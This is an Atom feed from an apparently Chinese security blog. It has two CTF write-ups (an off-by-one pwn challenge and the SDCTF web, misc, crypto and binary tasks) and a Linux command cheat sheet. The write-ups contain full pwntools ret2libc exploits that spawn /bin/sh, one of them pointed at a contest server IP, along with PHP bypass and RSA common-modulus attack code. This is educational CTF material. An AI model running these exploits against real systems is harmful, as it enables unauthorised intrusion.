<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Righteous</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://righte0us.cc/"/>
  <updated>2017-07-24T15:31:05.317Z</updated>
  <id>http://righte0us.cc/</id>
  
  <author>
    <name>Righteous</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>off-by-one</title>
    <link href="http://righte0us.cc/2017/07/24/off-by-one/"/>
    <id>http://righte0us.cc/2017/07/24/off-by-one/</id>
    <published>2017-07-24T15:14:10.000Z</published>
    <updated>2017-07-24T15:31:05.317Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Off-By-One-Error"><a href="#Off-By-One-Error" class="headerlink" title="Off-By-One Error"></a>Off-By-One Error</h1><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><p>差一错误（Off-by-one error）是指在计数时由于边界条件判断失误导致结果多一个单位或者少一个单位的错误，例如越界访问数组元素（访问数组最后一个元素的下一个内存单元）。<br>off-by-one错误可能会进一步引发其他错误，甚至是产生安全漏洞。例如对于代码memcpy(dst, src, size)，如果能够通过off-by-one来改写size的值使之大于dst指向的缓冲区的大小，那么调用memcpy时便会进一步引发缓冲区溢出漏洞。</p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><pre><code>righteous@ubuntu:~/Desktop/Saike/lab1$ file pwn200pwn200: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=fc609447c6b0ccfdb9df8b5bf26b50f152fe1950, stripped</code></pre><p>查看pwn为32位ELF文件</p><pre><code>gdb-peda$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : disabled</code></pre><p>开启了NX，将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令，所以无法在栈上填充并执行ShellCode，可以采用ROP，且题目提供了libc.so.6这个文件，如果能够实现函数地址泄漏的话，就可以拿到shell。</p><a id="more"></a><p>IDA PRO载入分析程序基本流程：</p><p><img src="/images/off/0.png" alt=""></p><p>从伪代码可以看出：</p><pre><code>1. 调用memset将缓冲区v1上的内容清零，缓冲区的长度为0x80字节；2. 调用read读取数据到buf缓冲区中，读取的最大长度为nbytes+1（即17）字节；3. 通过if来判断输入数据的合法性，即长度最多为10且前面8个字节的内容必须是syclover；4. 调用read读取nbytes字节的数据到缓冲区v1中；5. 调用write将缓冲区v1的内容写到标准输出流；</code></pre><p>栈上的数据分布示意图如下所示：<br><img src="/images/off/1.png" alt=""></p><p>buf的位置为ebp-0x1C，nbytes的位置为ebp-0x0C，二者之间的差距为0x10，即16字节。</p><pre><code>read(0, &amp;buf, nbytes + 1)</code></pre><p>这里指定read最多可以读取17字节的内容，也就是说这里存在缓冲区溢出，通过read读取17字节的内容，就可以改写nbytes本身的值。</p><pre><code>read(0, &amp;buf, nbytes + 1)</code></pre><p>可以改写nbytes最低位的一个字节的内容，例如可以将nbytes改写为0xFF。</p><pre><code>read(0, &amp;v1, nbytes)</code></pre><p>一旦我们可以控制nbytes，我们就可以控制read读取的内容的长度，而缓冲区v1的大小只有0x80字节，我们是可以通过缓冲溢出改写函数的返回地址。</p><pre><code>if ( strlen((const char *)&amp;buf) - 1 &lt;= 9 &amp;&amp; !strncmp(&quot;syclover&quot;, (const char *)&amp;buf, 8u) )</code></pre><p>该if判断很容易绕过，让buf的数据以syclover\0开头即可，因为read可以读取\0，而strlen以\0作为字符串结束符且strncmp指定了比较的长度为8。</p><p>v1的起始地址为ebp-0x9C，填充0x9C+4=0xA0=160字节的数据即可覆盖函数的返回地址，如下图所示：<br><img src="/images/off/2.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用分两个阶段：<br>第一阶段通过缓冲区溢出泄漏write函数的地址之后，我们让EIP再次跳转到sub_80484AC函数来执行，这样就可以接着进行第二阶段的缓冲区溢出过程，此时通过改写函数返回地址来执行system(“/bin/sh”)，即可获取到服务器的控制权限。</p><p>第一阶段栈上的数据：<br><img src="/images/off/3.jpg" alt=""></p><p>注： write函数的原型为ssize_t write(int fd, const void *buf, size_t nbytes)，其中第一个参数fd指明输出句柄，这里采用标准输出流stdout（值为1）；第二个参数是输出缓冲区的地址，这里填充为write函数的GOT地址；第三个参数为输出数据的字节数，因为地址占用4字节，所以填充为4即可。</p><p>第二阶段栈上的数据：<br><img src="/images/off/4.jpg" alt=""></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="Python">from pwn import *context.log_level = &#39;debug&#39;DEBUG = 1target = &quot;./pwn200&quot;if DEBUG:    p = process(target)        libc=ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)        elf = ELF(target)else:    p = remote(&quot;127.0.0.1&quot;,10001)        libc=ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)        elf = ELF(target)write_plt = elf.symbols[&#39;write&#39;] log.info(&#39;write_plt:&#39; + hex(write_plt))write_got = elf.got[&#39;write&#39;]log.info(&#39;write_got:&#39; + hex(write_got))vulner_func = 0x080484ACname = &quot;syclover&quot;payload1 = name + &#39;\x00&#39;*(16-len(name)) + &#39;\xFF&#39;p.recvuntil(&#39;:&#39;)p.send(payload1)payload2 = &#39;\x00&#39;*160 + p32(write_plt) + p32(vulner_func) + p32(1) + p32(write_got) + p32(4)p.recvuntil(&#39;:\x00&#39;)p.sendline(payload2)write_addr = u32(p.recvn(4)) p.recvuntil(&#39;:&#39;)p.send(payload1)system_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;]) binsh_addr = write_addr - (libc.symbols[&#39;write&#39;] - next(libc.search(&#39;/bin/sh&#39;))) payload3 = &#39;\x00&#39;*160  + p32(system_addr) + p32(vulner_func) + p32(binsh_addr) p.recvuntil(&#39;:&#39;)p.send(payload3) p.interactive()</code></pre><p>获取到shell：<br><img src="/images/off/5.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Off-By-One-Error&quot;&gt;&lt;a href=&quot;#Off-By-One-Error&quot; class=&quot;headerlink&quot; title=&quot;Off-By-One Error&quot;&gt;&lt;/a&gt;Off-By-One Error&lt;/h1&gt;&lt;h2 id=&quot;相关知识&quot;&gt;&lt;a href=&quot;#相关知识&quot; class=&quot;headerlink&quot; title=&quot;相关知识&quot;&gt;&lt;/a&gt;相关知识&lt;/h2&gt;&lt;p&gt;差一错误（Off-by-one error）是指在计数时由于边界条件判断失误导致结果多一个单位或者少一个单位的错误，例如越界访问数组元素（访问数组最后一个元素的下一个内存单元）。&lt;br&gt;off-by-one错误可能会进一步引发其他错误，甚至是产生安全漏洞。例如对于代码memcpy(dst, src, size)，如果能够通过off-by-one来改写size的值使之大于dst指向的缓冲区的大小，那么调用memcpy时便会进一步引发缓冲区溢出漏洞。&lt;/p&gt;
&lt;h2 id=&quot;逆向分析&quot;&gt;&lt;a href=&quot;#逆向分析&quot; class=&quot;headerlink&quot; title=&quot;逆向分析&quot;&gt;&lt;/a&gt;逆向分析&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;righteous@ubuntu:~/Desktop/Saike/lab1$ file pwn200
pwn200: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=fc609447c6b0ccfdb9df8b5bf26b50f152fe1950, stripped
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看pwn为32位ELF文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开启了NX，将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令，所以无法在栈上填充并执行ShellCode，可以采用ROP，且题目提供了libc.so.6这个文件，如果能够实现函数地址泄漏的话，就可以拿到shell。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://righte0us.cc/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Linux</title>
    <link href="http://righte0us.cc/2017/06/01/Linux/"/>
    <id>http://righte0us.cc/2017/06/01/Linux/</id>
    <published>2017-06-01T05:47:39.000Z</published>
    <updated>2017-06-04T05:57:23.874Z</updated>
    
    <content type="html"><![CDATA[<h1 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h1><pre><code>man #获取相关命令的帮助信息info #获取相关命令的详细使用方法</code></pre><a id="more"></a><h1 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h1><h2 id="基本文件操作"><a href="#基本文件操作" class="headerlink" title="基本文件操作"></a>基本文件操作</h2><p><strong>增</strong></p><pre><code>touch file #创建文件</code></pre><p><strong>删</strong></p><pre><code>rm option file-r 即recursive，递归删除-f 即force，强制删除</code></pre><h2 id="修"><a href="#修" class="headerlink" title="修"></a>修</h2><p><strong>修改位置</strong></p><pre><code>mv</code></pre><p><strong>修改权限</strong></p><pre><code>ln</code></pre><p><strong>修改文件所属者以及文件所属用户组</strong></p><pre><code>chown</code></pre><p><strong>修改属性</strong></p><pre><code>chmod</code></pre><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><p><strong>查看文件类型</strong></p><pre><code>file</code></pre><p><strong>查看内容</strong></p><pre><code>lscatmore #在终端屏幕上按帧显示文件less #按页显示文件head #显示文件的前几行tail #显示之地你个文件的最后部分strings</code></pre><p><strong>查找位置</strong></p><pre><code>whereislocatefind</code></pre><p><strong>查找内容</strong></p><pre><code>grep #安给定模式搜索文件内容</code></pre><p><strong>查看区别</strong></p><pre><code>diff #查看两个文本文件的区别，列出行不同之处</code></pre><p><strong>查其他</strong></p><pre><code>wc #显示指定文件的行数，词数或字符数</code></pre><h2 id="其他基本操作"><a href="#其他基本操作" class="headerlink" title="其他基本操作"></a>其他基本操作</h2><p><strong>备份与恢复</strong></p><pre><code>cpcpiodump #备份文件系统restore #还原由dump所备份下来的文件或者整个文件系统</code></pre><p><strong>压缩解压缩</strong></p><pre><code>gzip/gunzip #.gz文件的压缩/解压缩程序gzexe #压缩可执行文件tar #将若干文件存档或读取存档文件unarj #解压缩.arj文件zip/unzip #压缩解压缩zip文件zipinfo #列出zip压缩文件的详细信息bzip2/bunzip2 #压缩解压缩.bz2文件</code></pre><h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><pre><code>dd #从指定文件读取数据写到指定文件ln # 建立文件链接sort # 对指定文件按行进行排序tr # 转换字符</code></pre><h2 id="可执行文件操作"><a href="#可执行文件操作" class="headerlink" title="可执行文件操作"></a>可执行文件操作</h2><p><strong>链接</strong></p><pre><code>ldd file #查看可执行文件连接了哪些动态链接库</code></pre><p><strong>符号表</strong></p><pre><code>nm file #查看可执行文件里有哪些符号strip #去除可执行文件里的符号表，减小文件体积</code></pre><p><strong>文件基本结构</strong></p><pre><code>readelf</code></pre><p><strong>反汇编</strong></p><pre><code>objdump</code></pre><p><strong>进程管理</strong></p><pre><code># 进程查看ps -ef # 查看所有进程的详细信息# 杀死进程kill# 显示管理执行中的程序top</code></pre><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p><strong>查看用户信息</strong></p><pre><code># 查看用户标识id# 显示目前注册的用户以及用户正运行的命令w# 列出当前用户登录的信息last# 查看系统用户rhwo# 查找并显示用户信息finger</code></pre><p><strong>修改用户信息</strong></p><pre><code># 添加用户useradd# 删除用户userdel# 修改密码passwduserinfo #图形界面的修改工具usermod #修改用户属性，包括用户的shell类型，用户组等，甚至还能改登录名</code></pre><p><strong>修改用户权限</strong></p><pre><code>su</code></pre><p><strong>用户登录</strong></p><pre><code># 远程登入rlogin# 退出系统logout</code></pre><h2 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h2><p><strong>基本网络信息</strong></p><pre><code>ifconfig#防火墙相关iptables -L #查看防火墙设置arp#路由信息route -n #查看路由表#查看与某主机是否联通ping#查看到某一个主机的路由路径traceroute#查看计算机名hostname#查看主机标识hostid#显示网络连接、路由表和网络接口信息netstat -lntp #查看所有监听的端口netstat -antp #查看所有已经建立的链接netstat -s #查看网络统计信息</code></pre><p><strong>文件传输</strong></p><pre><code>#文件传输ftp#文件传输lftp#文件传输ncftp</code></pre><p><strong>网络浏览与下载</strong></p><pre><code>#从网络自动下载文件wgetcurl</code></pre><p><strong>邮件管理</strong></p><pre><code>#发送和接收电子邮件mail</code></pre><p><strong>远程通信</strong></p><pre><code>telnetnc#安全模式下的远程登录ssh</code></pre><p><strong>用户通信</strong></p><pre><code>#与主机另一用户通话talk#向其他用户的终端写信息write</code></pre><h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h2><p><strong>磁盘查看</strong></p><pre><code># 当前工作目录pwd# 查看当前目录ls# 树状列出当前目录tree# 目录或文件大小du# 磁盘相关信息df -h # 查看各分区使用情况# 磁盘已使用空间及限制quota</code></pre><p><strong>磁盘操作</strong></p><pre><code># 目录切换cd# 目录创建mkdir# 对磁盘进行分区fdisk -l # 查看所有分区# 挂载或者卸载文件系统mount/umount# 将内存缓冲区内的数据写入磁盘sync</code></pre><h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><p><strong>基本操作</strong></p><pre><code># 显示系统信息uname -a # 查看系统内核、操作系统、CPU信息# 显示开机信息dmesg# 关机shutdown# 重启reboot# 退出当前shellexit</code></pre><p><strong>环境变量</strong></p><pre><code># 设置或者显示环境变量exportimport# 查看环境变量env</code></pre><p><strong>指令</strong></p><pre><code># 设置指令的别名alias</code></pre><p><strong>时间</strong></p><pre><code># 调整RTC的时间clock# 设置或者显示系统的时间和日期date</code></pre><p><strong>内存</strong></p><pre><code># 显示内存状态free -m # 按单位为M查看内存和交换区状态，默认单位为字节</code></pre><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p><strong>模块</strong></p><pre><code># 显示已载入系统的模块lsmod# 自动处理可载入的模块modprobe</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;帮助&quot;&gt;&lt;a href=&quot;#帮助&quot; class=&quot;headerlink&quot; title=&quot;帮助&quot;&gt;&lt;/a&gt;帮助&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;man #获取相关命令的帮助信息
info #获取相关命令的详细使用方法
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://righte0us.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SDCTF</title>
    <link href="http://righte0us.cc/2017/04/08/SDCTF/"/>
    <id>http://righte0us.cc/2017/04/08/SDCTF/</id>
    <published>2017-04-08T05:31:48.000Z</published>
    <updated>2017-12-08T08:33:28.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p> 查看源码，发现extract函数，提交覆盖</p><pre><code>SDPC ==&gt;aaaaa&lt;br&gt;password ==&gt;sdpcsdpcsdpc&lt;br&gt;&lt;!-- if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {?&gt;     extract($_POST); if ($SDPC == $password) {      echo $key;--&gt;</code></pre><a id="more"></a><p><img src="/images/sdctf/1.png" alt=""></p><p>Flag:SDCTF{244fcba2093a5c942ee11f0f3f28f21f}</p><h2 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h2><p> 发现.git,访问发现aaa.php</p><p><img src="/images/sdctf/2.png" alt=""></p><pre><code>if (isset($_GET[&#39;a&#39;]) and isset($_GET[&#39;b&#39;])) {    if ($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;])       if (md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;]))          die(&#39;Flag: &#39;.$flag);       else          print &#39;Wrong.&#39;; }</code></pre><p><img src="/images/sdctf/3.png" alt=""><br>Flag: SDCTF{44224d27bfe875886f4b7247e16e48f8}</p><h2 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h2><p>打开题目我们直接就看到源码，加上注释如下</p><pre><code>&lt;?php$SDPC = @$_REQUEST[&#39;hello&#39;];     //$SDPC这个变量请求变量hello的值if(!preg_match(&#39;/^\w*$/&#39;,$SDPC )){ //正则表达式，匹配字符串，\w表示字符+数字+下划线，*代表有若干个\w字符  组成。die(&#39;ERROR&#39;);//不匹配则输出ERROR}eval(&quot;var_dump($$SDPC);&quot;);       //如果匹配输出\$\$SDPC的值</code></pre><p>而且通过题目链接可以知道hello变量一定是6位的，一开始真以为是爆破了，但是一想肯定很大，不可能。而且我们发现 $$a 这个东西很诡异。其实就是PHP中变量可以当作另一个变量的变量名。例如</p><pre><code>&lt;?php $a=&#39;b&#39;; $b=&quot;hello world!&quot;; eval(&quot;var_dump($$a);&quot;);?&gt;</code></pre><p>上面代码会输出hello world!<br>PHP一个比较有意思的变量!$GLOBALS：一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br>于是我们在url上构造/?hello=GLOBALS<br><img src="/images/sdctf/4.png" alt=""><br>Flag:SDCTF{f60eeabd0af6a908512983d844c00523}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc200"><a href="#Misc200" class="headerlink" title="Misc200"></a>Misc200</h2><p>通过即得flag<br><img src="/images/sdctf/5.png" alt=""><br>修改存档</p><p><img src="/images/sdctf/6.png" alt=""></p><p><img src="/images/sdctf/7.png" alt=""></p><h2 id="Mice200-Combine"><a href="#Mice200-Combine" class="headerlink" title="Mice200(Combine)"></a>Mice200(Combine)</h2><p>将下载的zip文件进行解压，里面有32个小文件，每个文件中是一个数字，给人感觉就是这个是ASCII值。将所有文件中的文本按照1，10，11，12……的顺序合并到一个文件中：</p><pre><code>cat crypto2/* &gt; 1.txt</code></pre><p>然后转换成对应字符串:</p><p><img src="/images/sdctf/8.png" alt=""> </p><p>Flag:SDCTF{c5d3effc5u7bedw217e7ndPecf60b5}</p><h2 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h2><p>rar爆破(pass:0522)，得到1.jpg，steghide隐写，解之得到FLAG.txt</p><p><img src="/images/sdctf/9.png" alt=""></p><p>Flag:SDCTF{25861b2471456810bea272fd666a8b79}</p><h2 id="Misc500-MP3stego"><a href="#Misc500-MP3stego" class="headerlink" title="Misc500(MP3stego)"></a>Misc500(MP3stego)</h2><p>根据RGB生成二维码</p><pre><code>from PIL import Imagex = 280y = 280f = open(&quot;QR.txt&quot;,&#39;r&#39;)rgbinfo = f.readlines()f.close()c = Image.new(&quot;RGB&quot;,(x,y))for i in range(0,x):   for j in range(0,y):      rgb = rgbinfo[i * y + j].split(&quot;,&quot;)      c.putpixel([i, j],(int(rgb[0]), int(rgb[1]),int(rgb[2])))c.show()</code></pre><p>得到：MP3stego的密码在1000-1300之间。</p><p>生成字典</p><pre><code>f =open(&#39;pwd.txt&#39;,&#39;a&#39;)line = &#39;&#39;for i in xrange(1000,1300):  f.write(line+str(i)+&#39;\n&#39;)f.close()</code></pre><p>循环爆破</p><pre><code>import osimport subprocessfor a in open(&#39;pwd.txt&#39;):   command=&#39;decode -X -P %s mp3.mp3&#39; % a.strip()   print command   p=subprocess.Popen(command,stdin=subprocess.PIPE,   stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)   if &quot;unexpected end of cipher message.&quot;not in p.communicate()[1]:      print &#39;[&gt;]password is find:%s&#39; %a.strip()      print command      flag = open(&#39;mp3.mp3.txt&#39;)      print flag.read()      break</code></pre><p><img src="/images/sdctf/10.png" alt=""><br>Flag:flag{Brute_f0Rce_iS_W0nderful}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto200-Knock"><a href="#Crypto200-Knock" class="headerlink" title="Crypto200(Knock)"></a>Crypto200(Knock)</h2><p>text文件中数字替换为英文字母得：zjqzhexjzmooqrssaidaiynlebnzjovosltahzjerhorrqxoeironlobdozavoouzjovosqfqsltahmqnqrrjotoerzjohorrqxoebooqydrztyqqojolx</p><p>与knock文件中…._…替换：<br>zjqz_hexjz_mo_oqrs_sai_daiyn_lebn_zjo_vos_ltah_zjer_horrqxo_e_iron_lobdo_za_voou_zjo_vos_qfqs_ltah_mqn_qrr_joto_er_zjo_horrqxo_ebooqydrztyqqojolx</p><p>在线解密（<a href="http://quipqiup.com/）" target="_blank" rel="noopener">http://quipqiup.com/）</a><br><img src="/images/sdctf/11.png" alt=""></p><p>that_might_be_easy_you_could_find_the_key_from_this_message_i_used_fence_to_keep_the_key_away_from_bad_ass_here_is_the_message_ineealcstrlaaehefg</p><p>ineealcstrlaaehefg，测试发现是栅栏加密，解出来得到icanseetherealflag<br>flag为SDCTF{md5(icanseetherealflag)}<br>Flag:SDCTF{ad0fe582c45dc970bfa9d6815d79684d}</p><h2 id="Crypto300-MD5"><a href="#Crypto300-MD5" class="headerlink" title="Crypto300(MD5)"></a>Crypto300(MD5)</h2><p>发现第51个文件大小异常，提取，hex中补全PNG文件头，得到：</p><p><img src="/images/sdctf/12.png" alt=""></p><p>MD5爆破即可</p><pre><code>import hashlibx = range(97,122)for a in x:    for b in x:        for c in x:            for d in x:                 for e in x:                     m = hashlib.md5()                     flag = &quot;SDCTF{a95&quot;+chr(a)+&quot;0b39186&quot;+chr(b)+&quot;887&quot;+chr(c)+&quot;949f87&quot;+chr(d)+&quot;20b44b&quot;+chr(e)+&quot;b5&quot;+&quot;}&quot;                         m.update(flag)                         n= m.hexdigest()                         n0 = list(n)                         if n0[0]==&#39;9&#39;:                           if n0[1]==&#39;5&#39;:                             if n0[2]==&#39;d&#39;:                               if n0[3]==&#39;c&#39;:                                 if n0[7]==&#39;8&#39;:                                   if n0[30]==&#39;a&#39;:                                      if n0[31]==&#39;3&#39;:                                        print n0                                        print flag</code></pre><p>Flag:SDCTF{a95a0b39186f887b949f87f20b44bdb5}</p><h2 id="Crypto500-RSA"><a href="#Crypto500-RSA" class="headerlink" title="Crypto500(RSA)"></a>Crypto500(RSA)</h2><p>分析加密脚本，使用了相同的N,不同的e,加密相同的数据,且两个加密指数互素，可以通过共模攻击在两个密文和公钥被嗅探的情况下还原出明文m的值</p><p>两个加密指数互质(e1,e2)=1,即存在s1,s2使得s1e1+s2e2=1<br>c1 ≡ me1 mod n<br>c2 ≡ me2 mod n<br>即 c1s1 c2s2 ≡ m mod n</p><pre><code>from libnum import n2s,s2nfrom gmpy2 import invertn=0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929Ldef egcd(a, b):  if a == 0:    return (b, 0, 1)  else:    g, y, x = egcd(b % a, a)    return (g, x - (b // a) * y, y)fo1 = open(&#39;flag.enc1&#39;, &#39;rb&#39;)fo2 = open(&#39;flag.enc2&#39;, &#39;rb&#39;)datafo1 = fo1.read()c1 = s2n(datafo1)fo1.close()datafo2 = fo2.read()c2 = s2n(datafo2)fo2.close()c2 = invert(c2,n)e1 = 17e2 = 65537s = egcd(e1,e2)s1 = s[1]s2 = s[2]s2 = - s2m = pow(c1, s1, n) * pow(c2, s2, n) % nprint n2s(m)</code></pre><p>flag.txt:<br>“You were not born a winner, and you were not born a loser. You are what you make yourself be.”SDCTF{ef31070d66440687a73beb6242f298bc}</p><h1 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h1><h2 id="Bin300-RC4"><a href="#Bin300-RC4" class="headerlink" title="Bin300(RC4)"></a>Bin300(RC4)</h2><p>RC4算法,逆向得到key和data<br>key= “I_am_the_flag”;<br>data={19,118,31,-9,43,-100,54,-56,-85,-91,-65,-51,-71,86,-27,-75,79,3,19,89,-46,58,10,68,121,85,-8,-36,-116,75,107,-68,124,81,-101,-112,-73,-80,37}</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned longULONG;void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len){    int i = 0, j = 0;    char k[256] = { 0 };    unsigned char tmp = 0;    for (i = 0; i&lt;256; i++)    {        s[i] = i;        k[i] = key[i%Len];    }    for (i = 0; i&lt;256; i++)    {        j = (j + s[i] + k[i]) % 256;        tmp = s[i];        s[i] = s[j];        s[j] = tmp;    }}void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len){    int i = 0, j = 0, t = 0;    unsigned long k = 0;    unsigned char tmp;    for (k = 0; k&lt;Len; k++)    {        i = (i + 1) % 256;        j = (j + s[i]) % 256;        tmp = s[i];        s[i] = s[j];        s[j] = tmp;        t = (s[i] + s[j]) % 256;        Data[k] ^= s[t];    }}int main(){    char s[256] = { 0 }, s2[256] = { 0 };    char key[256] = &quot;I_am_the_flag&quot;;    char flag[512]= {19,118,31,-9,43,-100,54,-56,-85,-91,-65,-51,-71,86,-27,-75,79,3,19,89,-46,58,10,68,121,85,-8,-36,-116,75,107,-68,124,81,-101,-112,-73,-80,37};    unsigned long len = strlen(flag);     int i;    rc4_init(s, (unsigned char*)key, strlen(key));    rc4_crypt(s, (unsigned char*)flag, len);    printf(&quot;%s&quot;,flag);    return 0;}</code></pre><p>或py解密</p><pre><code># -*- coding: utf-8 -*-import random, base64,binasciifrom hashlib import sha1def crypt(data, key):    &quot;&quot;&quot;RC4 algorithm&quot;&quot;&quot;    x = 0    box = range(256)    for i in range(256):        x = (x + box[i] + ord(key[i % len(key)])) % 256        box[i], box[x] = box[x], box[i]    x = y = 0    out = []    for char in data:        x = (x + 1) % 256        y = (y + box[x]) % 256        box[x], box[y] = box[y], box[x]        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))    return &#39;&#39;.join(out)data = &quot;数据&quot;key = &#39;密钥&#39;decoded_data = crypt(data,key)print decoded_data</code></pre><p>Flag:SDCTF{912128f324fd3ea3f5d9cb517b4d9001}</p><h2 id="Bin500-PwnPwnPwn"><a href="#Bin500-PwnPwnPwn" class="headerlink" title="Bin500(PwnPwnPwn)"></a>Bin500(PwnPwnPwn)</h2><pre><code>#!/usr/bin/env pythonfrom pwn import *libc = ELF(&#39;libc.so.6&#39;)elf = ELF(&#39;bin300&#39;)debug =0if debug ==1:  p = process(&#39;./bin300&#39;)else:  p = remote(&#39;123.207.144.156&#39;, 10003)plt_write = elf.symbols[&#39;write&#39;]got_write = elf.got[&#39;write&#39;]vulfun_addr = 0x804843bpayload1 = &#39;a&#39;*268  payload1 += p32(plt_write) payload1 += p32(vulfun_addr) payload1 += p32(1)payload1 += p32(got_write) payload1 += p32(4)p.send(payload1)write_addr = u32(p.recv(4))system_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])binsh_addr = write_addr - (libc.symbols[&#39;write&#39;] - next(libc.search(&#39;/bin/sh&#39;)))payload2 = &#39;a&#39;*268payload2 += p32(system_addr)payload2 += p32(vulfun_addr)payload2 += p32(binsh_addr)p.send(payload2)p.interactive()</code></pre><p><img src="/images/sdctf/13.png" alt=""></p><p>Flag:SDCTF{af15d5fdacd5fdfea300e88a8e253e82}</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;web100&quot;&gt;&lt;a href=&quot;#web100&quot; class=&quot;headerlink&quot; title=&quot;web100&quot;&gt;&lt;/a&gt;web100&lt;/h2&gt;&lt;p&gt; 查看源码，发现extract函数，提交覆盖&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&amp;gt;&amp;lt;!--
 if ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) {?&amp;gt;
     extract($_POST);
 if ($SDPC == $password) { 
     echo $key;
--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://righte0us.cc/tags/CTF/"/>
